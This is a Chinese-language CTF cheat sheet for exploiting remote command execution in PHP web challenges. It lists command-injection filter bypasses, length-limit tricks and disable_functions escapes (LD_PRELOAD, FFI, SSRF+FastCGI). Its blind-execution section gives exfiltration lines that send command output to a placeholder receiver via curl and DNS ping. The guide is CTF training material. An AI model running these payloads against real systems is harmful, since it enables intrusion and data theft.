能执行第一条命令只是开始。RCE 题的分水岭是：**过滤了什么、回显在哪、能不能出网、还剩下哪些函数**。先盘点再选绕过，不要一上来背 payload。

> 只对本地题目或授权环境执行命令；命令可能改变系统状态，先在快照/容器里验证。

## 00 30 秒速查

| 我要… | 先试… | 备注 |
|---|---|---|
| 确认执行 | `id`/`whoami`（题目允许） | 只读优先 |
| 分隔命令 | `;` `&&` `\|\|` `\|` `%0a` | 看 shell 类型 |
| 绕空格 | `${IFS}`、`$IFS$9`、`%09`、`{cat,/flag}` | 双引号内不展开 |
| 绕关键字 | `c'a't`、`/bin/c?t`、变量拼接 | 先确认过滤 |
| 绕字母数字 | `$(printf ...)`、base64 | 极端过滤 |
| 无回显 | 写 Web 目录/外带/延时 | 三选一 |
| 长度限制 | 短变量/分步写文件/通配 | 见下 |
| 禁用函数 | LD_PRELOAD/FFI/扩展/组合链 | 看版本 |
| 记录 | 入口/过滤/通道 | 三次复现 |

## 01 原理与成立条件

```text
输入 → 执行函数（system/eval/include/...）
        ├─ 直接回显 → 直接利用
        ├─ 无回显 → 文件/外带/时间
        └─ 被过滤 → 分隔符/编码/函数替换
```

| 条件 | 含义 | 不满足时 |
|---|---|---|
| 进入执行 sink | 命令/代码/包含/反序列化 | 找其他入口 |
| 至少一个可用字符集 | 分隔符/变量/通配 | 用编码重建 |
| 有输出通道 | 回显/文件/网络/时间 | 先建通道 |
| 权限允许 | Web 用户可读/可写 | 换目录/提权 |

| 盘点项 | 怎么看 | 影响 |
|---|---|---|
| 执行类型 | 函数名/报错 | 命令 or 代码 |
| 过滤 | 源码/报错/`phpinfo` | 绕过方向 |
| 回显 | 页面/文件/日志 | 直接 or 外带 |
| 出网 | `curl`/`ping`/DNS | HTTP/DNS |
| 禁用函数 | `ini_get`/`phpinfo` | 能否直接调用 |
| 目录 | `pwd`/`open_basedir` | 可写路径 |

## 02 判断与分型

```text
能执行吗？
 ├─ 有回显 → 直接读目标
 ├─ 无回显 → 写文件/外带/延时
 └─ 被过滤
     ├─ 分隔符 → 换行/管道/替换
     ├─ 空格 → IFS/Tab/重定向
     ├─ 关键字 → 引号/通配/变量
     ├─ 字母数字 → printf/base64
     └─ 函数禁用 → 扩展/组合链
```

| 信号 | 含义 | 下一步 |
|---|---|---|
| `sh: 1: ... not found` | 进入 shell | 修命令 |
| 只有第一段执行 | 分隔符被过滤 | 换分隔符 |
| `cat` 被替换为空 | 关键字过滤 | 拼接/通配 |
| 页面空白但文件出现 | 写文件通道 | 只读访问 |
| 固定延时 | 时间通道 | 多次测量 |
| `disable_functions` | 函数禁用 | 换函数/扩展 |
| `open_basedir` | 目录限制 | 换可写目录 |

| 假阳性 | 原因 | 处理 |
|---|---|---|
| 回显命令文本 | 只是输出输入 | 看执行结果 |
| 单次延时 | 网络抖动 | 三次取中位数 |
| 写文件失败 | 目录不可写 | 换 `/tmp`/Web 目录 |
| 外带没收到 | 出网被禁 | 用 DNS/延时 |

## 03 利用阶梯

### L0 盘点执行面

**前提**：已有一个疑似命令/代码执行入口。

**步骤**：
1. 用只读命令确认身份与目录。
2. 看报错确认 shell（`sh`/`bash`/`cmd`）。
3. 读 `phpinfo`/`ini_get` 确认禁用函数与 `open_basedir`。
4. 测出网：DNS/HTTP 回连。

**成功标志**：知道能执行什么、不能执行什么、输出在哪。

**失败分支**：无回显→L3；函数禁用→L4。

### L1 基础绕过

**前提**：有过滤，但仍有可用字符。

**步骤**：
1. 分隔符：`;`→`%0a`→`&&`→`|`。
2. 空格：`${IFS}`、`$IFS$9`、`%09`、`<`、`{cat,/flag}`。
3. 关键字：`c'a't`、`c\at`、`/bin/c?t`、`fl*`。
4. 斜杠：`${PATH:0:1}`、`$(printf '\57')`。

**成功标志**：过滤条件下命令仍执行。

**失败分支**：全字符黑名单→L4；长度限制→L2。

### L2 长度限制与分步构造

**前提**：输入长度受限，但有写文件/多请求能力。

**步骤**：
1. 短变量传参：`a=system&b=id`。
2. 分步写脚本：`>a` → `echo -n ... >>a` → `sh a`。
3. 通配：`cat /f*`、`nl /???/????`。
4. 用 `*` 拼接目录下文件名。

**成功标志**：短输入完成执行/读文件。

**失败分支**：无写权限→外带/延时；过滤 `>`→换编码。

### L3 无回显

**前提**：命令执行成功但响应看不到输出。

**步骤**：
1. 写 Web 目录：`echo test > /var/www/html/x.txt`，再访问。
2. 外带：`curl http://<你的接收端>/$(whoami)`。
3. DNS：`ping -c 1 $(id|base64).<域名>`。
4. 时间：`sleep 3`/`ping -c 3 127.0.0.1`，三次取中位数。

**成功标志**：文件/请求/延时稳定出现。

**失败分支**：目录不可写→换 `/tmp`；出网禁→时间盲；`sleep` 禁→`ping`。

### L4 disable_functions 与组合链

**前提**：命令函数被禁用，但仍有 PHP 代码执行/文件能力。

**步骤**：
1. 读禁用列表与 PHP 版本。
2. 试 LD_PRELOAD（`putenv` + 触发新进程）。
3. PHP≥7.4 且 `ffi.enable=1` 试 FFI。
4. 第三方扩展：ImageMagick/IMAP/GD。
5. 组合：文件包含+日志/session、SSRF+FastCGI、反序列化 POP 链。

**成功标志**：在禁用条件下仍执行命令/读文件。

**失败分支**：版本已修→换扩展；无扩展→找 `auto_prepend_file`/`.user.ini`。

## 04 绕过与边界

| 过滤 | 绕过 | 示例 |
|---|---|---|
| 空格 | `$IFS`/Tab/`<` | `cat$IFS/flag` |
| `;` | 换行/`&&`/`\|` | `%0aid` |
| `cat` | 引号/通配/变量 | `c'a't /f*` |
| 字母数字 | `printf`/base64 | `$(printf '\x69\x64')` |
| `/` | `${PATH:0:1}` | 取路径首字符 |
| 长度 | 分步写/短变量 | `>a` 拼接 |
| 函数禁用 | 扩展/FFI/LD_PRELOAD | 看版本 |
| 无回显 | 文件/外带/时间 | 三通道 |

边界：`open_basedir` 限制文件路径；`disable_functions` 只禁函数名，不禁扩展；写文件后记得清理。

## 06 差异速查

| 环境 | 特点 | 影响 |
|---|---|---|
| `sh` | 支持 `;` `&&` `\|\|` `\|` | 常规 |
| `bash` | 支持 `$'\x..'`、`{a,b}` | 更多构造 |
| `cmd.exe` | `&` `&&` `\|\|` | 与 sh 不同 |
| PHP 5 | `assert` 字符串执行 | 老题 |
| PHP 7+ | `assert` 不再执行字符串 | 换 `eval` |
| PHP 8 | 更多函数移除 | 看版本 |
| `open_basedir` | 路径白名单 | 换目录 |

## 09 失败分支

| 现象 | 优先怀疑 | 处理 |
|---|---|---|
| 命令不执行 | 未进 shell/函数禁用 | 确认 sink/换函数 |
| 只有第一段 | 分隔符过滤 | 换行/管道 |
| `cat` 无效 | 关键字过滤 | 引号/通配 |
| 写文件失败 | 目录不可写 | `/tmp`/Web 目录 |
| 外带无请求 | 出网禁 | DNS/延时 |
| 延时不稳 | 网络/负载 | 三次取中位数 |
| 函数全禁 | `disable_functions` | 扩展/组合链 |
| 读不到 flag | 权限/路径 | `find`/换目录 |
